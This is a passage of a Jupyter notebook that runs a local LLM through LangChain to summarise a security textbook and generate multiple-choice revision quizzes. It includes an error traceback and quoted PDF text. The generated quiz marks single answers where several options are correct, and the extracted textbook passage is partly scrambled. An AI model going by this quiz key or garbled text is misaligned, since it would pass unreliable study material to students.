\u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mcreate_outputs(response)[\u001b[38;5;241m0\u001b[39m]\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/llm.py:115\u001b[0m, in \u001b[0;36mLLMChain.generate\u001b[0;34m(self, input_list, run_manager)\u001b[0m\n\u001b[1;32m    113\u001b[0m callbacks \u001b[38;5;241m=\u001b[39m run_manager\u001b[38;5;241m.\u001b[39mget_child() \u001b[38;5;28;01mif\u001b[39;00m run_manager \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[1;32m    114\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm, BaseLanguageModel):\n\u001b[0;32m--> 115\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm\u001b[38;5;241m.\u001b[39mgenerate_prompt(\n\u001b[1;32m    116\u001b[0m         prompts,\n\u001b[1;32m    117\u001b[0m         stop,\n\u001b[1;32m    118\u001b[0m         callbacks\u001b[38;5;241m=\u001b[39mcallbacks,\n\u001b[1;32m    119\u001b[0m         \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39m\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm_kwargs,\n\u001b[1;32m    120\u001b[0m     )\n\u001b[1;32m    121\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m    122\u001b[0m     results \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm\u001b[38;5;241m.\u001b[39mbind(stop\u001b[38;5;241m=\u001b[39mstop, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39m\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm_kwargs)\u001b[38;5;241m.\u001b[39mbatch(\n\u001b[1;32m    123\u001b[0m         cast(List, prompts), {\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mcallbacks\u001b[39m\u001b[38;5;124m\"\u001b[39m: callbacks}\n\u001b[1;32m    124\u001b[0m     )\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/language_models/llms.py:525\u001b[0m, in \u001b[0;36mBaseLLM.generate_prompt\u001b[0;34m(self, prompts, stop, callbacks, **kwargs)\u001b[0m\n\u001b[1;32m    517\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mgenerate_prompt\u001b[39m(\n\u001b[1;32m    518\u001b[0m     \u001b[38;5;28mself\u001b[39m,\n\u001b[1;32m    519\u001b[0m     prompts: List[PromptValue],\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    522\u001b[0m     \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs: Any,\n\u001b[1;32m    523\u001b[0m ) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m LLMResult:\n\u001b[1;32m    524\u001b[0m     prompt_strings \u001b[38;5;241m=\u001b[39m [p\u001b[38;5;241m.\u001b[39mto_string() \u001b[38;5;28;01mfor\u001b[39;00m p \u001b[38;5;129;01min\u001b[39;00m prompts]\n\u001b[0;32m--> 525\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mgenerate(prompt_strings, stop\u001b[38;5;241m=\u001b[39mstop, callbacks\u001b[38;5;241m=\u001b[39mcallbacks, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/language_models/llms.py:698\u001b[0m, in \u001b[0;36mBaseLLM.generate\u001b[0;34m(self, prompts, stop, callbacks, tags, metadata, run_name, **kwargs)\u001b[0m\n\u001b[1;32m    682\u001b[0m         \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\n\u001b[1;32m    683\u001b[0m             \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAsked to cache, but no cache found at `langchain.cache`.\u001b[39m\u001b[38;5;124m\"\u001b[39m\n\u001b[1;32m    684\u001b[0m         )\n\u001b[1;32m    685\u001b[0m     run_managers \u001b[38;5;241m=\u001b[39m [\n\u001b[1;32m    686\u001b[0m         callback_manager\u001b[38;5;241m.\u001b[39mon_llm_start(\n\u001b[1;32m    687\u001b[0m             dumpd(\u001b[38;5;28mself\u001b[39m),\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    696\u001b[0m         )\n\u001b[1;32m    697\u001b[0m     ]\n\u001b[0;32m--> 698\u001b[0m     output \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_generate_helper(\n\u001b[1;32m    699\u001b[0m         prompts, stop, run_managers, \u001b[38;5;28mbool\u001b[39m(new_arg_supported), \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs\n\u001b[1;32m    700\u001b[0m     )\n\u001b[1;32m    701\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m output\n\u001b[1;32m    702\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(missing_prompts) \u001b[38;5;241m>\u001b[39m \u001b[38;5;241m0\u001b[39m:\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/language_models/llms.py:562\u001b[0m, in \u001b[0;36mBaseLLM._generate_helper\u001b[0;34m(self, prompts, stop, run_managers, new_arg_supported, **kwargs)\u001b[0m\n\u001b[1;32m    560\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m run_manager \u001b[38;5;129;01min\u001b[39;00m run_managers:\n\u001b[1;32m    561\u001b[0m         run_manager\u001b[38;5;241m.\u001b[39mon_llm_error(e, response\u001b[38;5;241m=\u001b[39mLLMResult(generations\u001b[38;5;241m=\u001b[39m[]))\n\u001b[0;32m--> 562\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m e\n\u001b[1;32m    563\u001b[0m flattened_outputs \u001b[38;5;241m=\u001b[39m output\u001b[38;5;241m.\u001b[39mflatten()\n\u001b[1;32m    564\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m manager, flattened_output \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mzip\u001b[39m(run_managers, flattened_outputs):\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/language_models/llms.py:549\u001b[0m, in \u001b[0;36mBaseLLM._generate_helper\u001b[0;34m(self, prompts, stop, run_managers, new_arg_supported, **kwargs)\u001b[0m\n\u001b[1;32m    539\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m_generate_helper\u001b[39m(\n\u001b[1;32m    540\u001b[0m     \u001b[38;5;28mself\u001b[39m,\n\u001b[1;32m    541\u001b[0m     prompts: List[\u001b[38;5;28mstr\u001b[39m],\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    545\u001b[0m     \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs: Any,\n\u001b[1;32m    546\u001b[0m ) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m LLMResult:\n\u001b[1;32m    547\u001b[0m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m    548\u001b[0m         output \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m--> 549\u001b[0m             \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_generate(\n\u001b[1;32m    550\u001b[0m                 prompts,\n\u001b[1;32m    551\u001b[0m                 stop\u001b[38;5;241m=\u001b[39mstop,\n\u001b[1;32m    552\u001b[0m                 \u001b[38;5;66;03m# TODO: support multiple run managers\u001b[39;00m\n\u001b[1;32m    553\u001b[0m                 run_manager\u001b[38;5;241m=\u001b[39mrun_managers[\u001b[38;5;241m0\u001b[39m] \u001b[38;5;28;01mif\u001b[39;00m run_managers \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m,\n\u001b[1;32m    554\u001b[0m                 \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs,\n\u001b[1;32m    555\u001b[0m             )\n\u001b[1;32m    556\u001b[0m             \u001b[38;5;28;01mif\u001b[39;00m new_arg_supported\n\u001b[1;32m    557\u001b[0m             \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_generate(prompts, stop\u001b[38;5;241m=\u001b[39mstop)\n\u001b[1;32m    558\u001b[0m         )\n\u001b[1;32m    559\u001b[0m     \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    560\u001b[0m         \u001b[38;5;28;01mfor\u001b[39;00m run_manager \u001b[38;5;129;01min\u001b[39;00m run_managers:\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/language_models/llms.py:1134\u001b[0m, in \u001b[0;36mLLM._generate\u001b[0;34m(self, prompts, stop, run_manager, **kwargs)\u001b[0m\n\u001b[1;32m   1131\u001b[0m new_arg_supported \u001b[38;5;241m=\u001b[39m inspect\u001b[38;5;241m.\u001b[39msignature(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call)\u001b[38;5;241m.\u001b[39mparameters\u001b[38;5;241m.\u001b[39mget(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mrun_manager\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[1;32m   1132\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m prompt \u001b[38;5;129;01min\u001b[39;00m prompts:\n\u001b[1;32m   1133\u001b[0m     text \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m-> 1134\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(prompt, stop\u001b[38;5;241m=\u001b[39mstop, run_manager\u001b[38;5;241m=\u001b[39mrun_manager, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[1;32m   1135\u001b[0m         \u001b[38;5;28;01mif\u001b[39;00m new_arg_supported\n\u001b[1;32m   1136\u001b[0m         \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(prompt, stop\u001b[38;5;241m=\u001b[39mstop, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[1;32m   1137\u001b[0m     )\n\u001b[1;32m   1138\u001b[0m     generations\u001b[38;5;241m.\u001b[39mappend([Generation(text\u001b[38;5;241m=\u001b[39mtext)])\n\u001b[1;32m   1139\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m LLMResult(generations\u001b[38;5;241m=\u001b[39mgenerations)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_community/llms/llamacpp.py:291\u001b[0m, in \u001b[0;36mLlamaCpp._call\u001b[0;34m(self, prompt, stop, run_manager, **kwargs)\u001b[0m\n\u001b[1;32m    286\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mstreaming:\n\u001b[1;32m    287\u001b[0m     \u001b[38;5;66;03m# If streaming is enabled, we use the stream\u001b[39;00m\n\u001b[1;32m    288\u001b[0m     \u001b[38;5;66;03m# method that yields as they are generated\u001b[39;00m\n\u001b[1;32m    289\u001b[0m     \u001b[38;5;66;03m# and return the combined strings from the first choices's text:\u001b[39;00m\n\u001b[1;32m    290\u001b[0m     combined_text_output \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m\"\u001b[39m\n\u001b[0;32m--> 291\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m chunk \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_stream(\n\u001b[1;32m    292\u001b[0m         prompt\u001b[38;5;241m=\u001b[39mprompt,\n\u001b[1;32m    293\u001b[0m         stop\u001b[38;5;241m=\u001b[39mstop,\n\u001b[1;32m    294\u001b[0m         run_manager\u001b[38;5;241m=\u001b[39mrun_manager,\n\u001b[1;32m    295\u001b[0m         \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs,\n\u001b[1;32m    296\u001b[0m     ):\n\u001b[1;32m    297\u001b[0m         combined_text_output \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m chunk\u001b[38;5;241m.\u001b[39mtext\n\u001b[1;32m    298\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m combined_text_output\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_community/llms/llamacpp.py:344\u001b[0m, in \u001b[0;36mLlamaCpp._stream\u001b[0;34m(self, prompt, stop, run_manager, **kwargs)\u001b[0m\n\u001b[1;32m    342\u001b[0m params \u001b[38;5;241m=\u001b[39m {\u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39m\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_get_parameters(stop), \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs}\n\u001b[1;32m    343\u001b[0m result \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mclient(prompt\u001b[38;5;241m=\u001b[39mprompt, stream\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mTrue\u001b[39;00m, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mparams)\n\u001b[0;32m--> 344\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m part \u001b[38;5;129;01min\u001b[39;00m result:\n\u001b[1;32m    345\u001b[0m     logprobs \u001b[38;5;241m=\u001b[39m part[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mchoices\u001b[39m\u001b[38;5;124m\"\u001b[39m][\u001b[38;5;241m0\u001b[39m]\u001b[38;5;241m.\u001b[39mget(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mlogprobs\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m)\n\u001b[1;32m    346\u001b[0m     chunk \u001b[38;5;241m=\u001b[39m GenerationChunk(\n\u001b[1;32m    347\u001b[0m         text\u001b[38;5;241m=\u001b[39mpart[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mchoices\u001b[39m\u001b[38;5;124m\"\u001b[39m][\u001b[38;5;241m0\u001b[39m][\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mtext\u001b[39m\u001b[38;5;124m\"\u001b[39m],\n\u001b[1;32m    348\u001b[0m         generation_info\u001b[38;5;241m=\u001b[39m{\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mlogprobs\u001b[39m\u001b[38;5;124m\"\u001b[39m: logprobs},\n\u001b[1;32m    349\u001b[0m     )\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/llama_cpp/llama.py:953\u001b[0m, in \u001b[0;36mLlama._create_completion\u001b[0;34m(self, prompt, suffix, max_tokens, temperature, top_p, min_p, typical_p, logprobs, echo, stop, frequency_penalty, presence_penalty, repeat_penalty, top_k, stream, seed, tfs_z, mirostat_mode, mirostat_tau, mirostat_eta, model, stopping_criteria, logits_processor, grammar, logit_bias)\u001b[0m\n\u001b[1;32m    950\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_ctx\u001b[38;5;241m.\u001b[39mreset_timings()\n\u001b[1;32m    952\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(prompt_tokens) \u001b[38;5;241m>\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_n_ctx:\n\u001b[0;32m--> 953\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\n\u001b[1;32m    954\u001b[0m         \u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mRequested tokens (\u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mlen\u001b[39m(prompt_tokens)\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m) exceed context window of \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mllama_cpp\u001b[38;5;241m.\u001b[39mllama_n_ctx(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mctx)\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m\n\u001b[1;32m    955\u001b[0m     )\n\u001b[1;32m    957\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m max_tokens \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m \u001b[38;5;129;01mor\u001b[39;00m max_tokens \u001b[38;5;241m<\u001b[39m\u001b[38;5;241m=\u001b[39m \u001b[38;5;241m0\u001b[39m:\n\u001b[1;32m    958\u001b[0m     \u001b[38;5;66;03m# Unlimited, depending on n_ctx.\u001b[39;00m\n\u001b[1;32m    959\u001b[0m     max_tokens \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_n_ctx \u001b[38;5;241m-\u001b[39m \u001b[38;5;28mlen\u001b[39m(prompt_tokens)\n",
      "\u001b[0;31mValueError\u001b[0m: Requested tokens (4551) exceed context window of 512"
     ]
    }
   ],
   "source": [
    "print(f\"Processing document ...\")\n",
    "print(f\"This doc has {llm.get_num_tokens(pdfs[0].page_content)} tokens.\")\n",
    "print(f\"This doc has {len(pdfs[0].page_content)} characters. {len(pdfs[0].page_content) / llm.get_num_tokens(pdfs[0].page_content)} characters per token.\")\n",
    "with get_openai_callback() as cb:\n",
    "    summary = summary_chain.invoke(pdfs)\n",
    "    print(f\"Callback: \\n{cb}\")\n",
    "print(f\"Summary is: {summary}\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['input_documents', 'output_text'])"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "summary.keys()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(17791, 833)"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(summary['input_documents'][0].page_content), len(summary['output_text'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pprint import pprint\n",
    "\n",
    "# pprint(summary['input_documents'][0].page_content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('Question 1: What is the purpose of a user-name in a computer system?\\n'\n",
      " 'Options: \\n'\n",
      " 'A) To establish authentication of identity\\n'\n",
      " \"B) To prove the user's identity using something they know\\n\"\n",
      " 'C) To establish identity\\n'\n",
      " 'D) To prevent password guessing attacks\\n'\n",
      " 'Answer: C) To establish identity\\n'\n",
      " '\\n'\n",
      " \"Question 2: What is a potential method for a hacker to find out a user's \"\n",
      " 'password?\\n'\n",
      " 'Options:\\n'\n",
      " 'A) Guessing using personal knowledge of the user\\n'\n",
      " 'B) Fake log-in screens\\n'\n",
      " 'C) Asking the user directly\\n'\n",
      " 'D) Phishing\\n'\n",
      " 'Answer: A) Guessing using personal knowledge of the user\\n'\n",
      " '\\n'\n",
      " 'Question 3: What is a user and system defense to minimize the risk of a '\n",
      " 'hacker getting hold of a password?\\n'\n",
      " 'Options:\\n'\n",
      " 'A) Limit log-in attempts\\n'\n",
      " 'B) Revealing the password to anyone\\n'\n",
      " 'C) Using the same password for all systems\\n'\n",
      " 'D) Leaving the password option as blank\\n'\n",
      " 'Answer: A) Limit log-in attempts')\n"
     ]
    }
   ],
   "source": [
    "pprint(summary['output_text'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    Prompt vs. Output\n",
    "\n",
    "| Prompt | Output |\n",
    "| --- | --- |\n",
    "| Write a summary of the following text delimited by triple backquotes.<br>Return your response in bullet points which covers the key points of the text.<br>```{text}```<br>BULLET POINT SUMMARY: | '- Identification and authentication are important aspects of computer '<br> 'security\\n'<br> '- Methods for identifying computer users and minimizing security threats are '<br> 'explored\\n'<br> '- User-names and passwords are used for identification and authentication\\n'<br> '- Different kinds of threats such as password guessing attacks, password '<br> 'spoofing attacks, and attacks on the password file are identified\\n'<br> '- Measures to prevent or detect these attacks are discussed\\n'<br> '- Different methods for identification and authentication are explored\\n'<br> '- The importance of educating system users to choose strong passwords is '<br>'emphasized\\n'<br> '- Ways to protect a password file and implement one-time passwords are '<br> 'discussed\\n'<br> '- Various attacks on user-name/password identification systems are '<br> 'described, including password guessing, dictionary searching, intelligent '<br> 'searching, and exhaustive searching\\n'<br> '- Password spoofing attacks, phishing, and user and system defenses are also '<br> 'covered.' |\n",
    "|Extract key points which can help students revise from the following text delimited by triple backquotes.<br>Return your response in bullet points which covers the key points of the text.<br>```{text}```<br>BULLET POINT SUMMARY: | '- Identification and authentication are important aspects of computer '<br> 'security\\n'<br> '- Methods for identifying computer users and minimizing security threats\\n'<br> '- Familiarity with concepts of identification and authentication\\n'<br> '- Understanding of different kinds of threats such as password guessing '<br> 'attacks, password spoofing attacks, and attacks on the password file\\n'<br> '- Importance of educating system users to choose strong passwords\\n'<br> '- Protection of password file using one-way function to encrypt passwords\\n'<br> '- Implementation of one-time passwords to reduce the risk of password '<br> 'discovery\\n'<br> '- Familiarity with alternative methods for identification and '<br> 'authentication\\n'<br> '- Assessment of security needs when choosing a method for a given situation\\n'<br> '- Two stages in the process of identification: establishing identity with a '<br> 'user-name and authenticating identity with a password\\n'<br> '- Different ways a password can be guessed and defenses against these '<br> 'attacks\\n'<br> '- Number of passwords and time it takes to guess them\\n'<br> '- Password spoofing attacks and defenses against them\\n'<br> '- User and system defenses to minimize the risk of a hacker getting hold of '<br> 'a password' |\n",
    "| Using the content provided below from a PDF delimited by triple backquotes, <br>please generate a multiple-choice test consisting of 3 questions to aid students in their review. <br>Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:<br>Begin each question with the word \"Question\" and a number, followed by a colon.<br>Then, provide the options for the question beginning with the word \"Options\" and a colon.<br>Ensure that for each question, there is one correct answer and three plausible but incorrect options. <br>End each question with the word \"Answer\" and a colon, followed by the correct answer.<br>```{text}``` | 'Question 1: What is the purpose of a user-name in a computer system?\\n'<br> 'Options: \\n'<br> 'A) To establish authentication of identity\\n'<br> \"B) To prove the user's identity using something they know\\n\"<br> 'C) To establish identity\\n'<br> 'D) To prevent password guessing attacks\\n'<br> 'Answer: C) To establish identity\\n'<br> '\\n'<br> \"Question 2: What is a potential method for a hacker to find out a user's \"<br> 'password?\\n'<br> 'Options:\\n'<br> 'A) Guessing using personal knowledge of the user\\n'<br> 'B) Fake log-in screens\\n'<br> 'C) Asking the user directly\\n'<br> 'D) Phishing\\n'<br> 'Answer: A) Guessing using personal knowledge of the user\\n'<br> '\\n'<br> 'Question 3: What is a user and system defense to minimize the risk of a '<br> 'hacker getting hold of a password?\\n'<br> 'Options:\\n'<br> 'A) Limit log-in attempts\\n'<br> 'B) Revealing the password to anyone\\n'<br>'C) Using the same password for all systems\\n'<br> 'D) Leaving the password option as blank\\n'<br> 'Answer: A) Limit log-in attempts' |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Map Reduce"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We have 137 documents.\n"
     ]
    }
   ],
   "source": [
    "from langchain.chains.summarize import load_summarize_chain\n",
    "\n",
    "print(f\"We have {len(docs)} documents.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "We have 5 documents.\n"
     ]
    }
   ],
   "source": [
    "docs = docs[10:15]\n",
    "print(f\"We have {len(docs)} documents.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain import PromptTemplate\n",
    "\n",
    "map_prompt = \"\"\"\n",
    "Summarize the following text delimited by triple backquotes.\n",
    "The summary should contain the key points of the text and help students revise.\n",
    "```{text}```\n",
    "\"\"\"\n",
    "\n",
    "map_prompt_template = PromptTemplate(template=map_prompt, input_variables=[\"text\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Using the content provided below from a PDF delimited by triple backquotes, \n",
      "please generate a multiple-choice test consisting of 3 questions to aid students in their review. \n",
      "Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:\n",
      "Begin each question with the word \"Question\" and a number, followed by a colon.\n",
      "Then, provide the options for the question beginning with the word \"Options\" and a colon.\n",
      "Each option should begin with a letter (A, B, C, or D) followed by a period and a space.\n",
      "Ensure that for each question, there is one correct answer and three plausible but incorrect options. \n",
      "End each question with the word \"Answer\" and a colon, followed by the correct answer.\n",
      "    \n",
      "```{text}```\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "n_questions = 3\n",
    "combine_prompt = \"\"\"\n",
    "Using the summary provided below from a PDF delimited by triple backquotes,\n",
    "please generate a multiple-choice test consisting of {n_questions} questions to aid students in their review. \n",
    "Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:\n",
    "Begin each question with the word \"Question\" and a number, followed by a colon.\n",
    "Then, provide the options for the question beginning with the word \"Options\" and a colon.\n",
    "Each option should begin with a letter (A, B, C, or D) followed by a period and a space.\n",
    "Ensure that for each question, there is one correct answer and three plausible but incorrect options. \n",
    "End each question with the word \"Answer\" and a colon, followed by the correct answer.\n",
    "    \n",
    "```{text}```\n",
    "\"\"\"\n",
    "combine_prompt = re.sub(r\"{n_questions}\", str(n_questions), combine_prompt)\n",
    "print(combine_prompt)\n",
    "combine_prompt_template = PromptTemplate(template=combine_prompt, input_variables=[\"text\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "quiz_chain = load_summarize_chain(llm,\n",
    "                                  chain_type=\"map_reduce\",\n",
    "                                  map_prompt=map_prompt_template,\n",
    "                                  combine_prompt=combine_prompt_template,\n",
    "                                  verbose=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\n",
      "\u001b[1m> Entering new MapReduceDocumentsChain chain...\u001b[0m\n",
      "\n",
      "\n",
      "\u001b[1m> Entering new LLMChain chain...\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Summarize the following text delimited by triple backquotes.\n",
      "The summary should contain the key points of the text and help students revise.\n",
      "```Uniform distribution: The distribution of numbers in the sequence should be uniform; that is, the frequency of occurrence of each of the numbers should be approximately the same.\n",
      "\n",
      "Independence: No one value in the sequence can be inferred from the others.\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 77\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "78 ChaPTer 2 / CryPTograPhiC ToolS\n",
      "\n",
      "Although there are well-defined tests for determining that a sequence of num- bers matches a particular distribution, such as the uniform distribution, there is no such test to “prove” independence. Rather, a number of tests can be applied to dem- onstrate if a sequence does not exhibit independence. The general strategy is to apply a number of such tests until the confidence that independence exists is sufficiently strong.\n",
      "\n",
      "In the context of our discussion, the use of a sequence of numbers that appear statistically random often occurs in the design of algorithms related to cryptography. For example, a fundamental requirement of the RSA public-key encryption scheme is the ability to generate prime numbers. In general, it is difficult to determine if a given large number N is prime. A brute-force approach would be to divide N by every odd N. If N is on the order, say, of 10150, a not uncommon occurrence in integer less than public-key cryptography, such a brute-force approach, is beyond the reach of human analysts and their computers. However, a number of effective algorithms exist that test the primality of a number by using a sequence of randomly chosen integers as input to relatively simple computations. If the sequence is sufficiently long (but far, far 10150 ), the primality of a number can be determined with near certainty. This less than type of approach, known as randomization, crops up frequently in the design of algo- rithms. In essence, if a problem is too hard or time-consuming to solve exactly, a simpler, shorter approach based on randomization is used to provide an answer with any desired level of confidence.\n",
      "\n",
      "1\n",
      "\n",
      "2\n",
      "\n",
      "unprEDictability In applications such as reciprocal authentication and session key generation, the requirement is not so much that the sequence of numbers be statistically random, but that the successive members of the sequence are unpre- dictable. With “true” random sequences, each number is statistically independent of other numbers in the sequence and therefore unpredictable. However, as discussed shortly, true random numbers are not always used; rather, sequences of numbers that appear to be random are generated by some algorithm. In this latter case, care must be taken that an opponent is not be able to predict future elements of the sequence on the basis of earlier elements.\n",
      "\n",
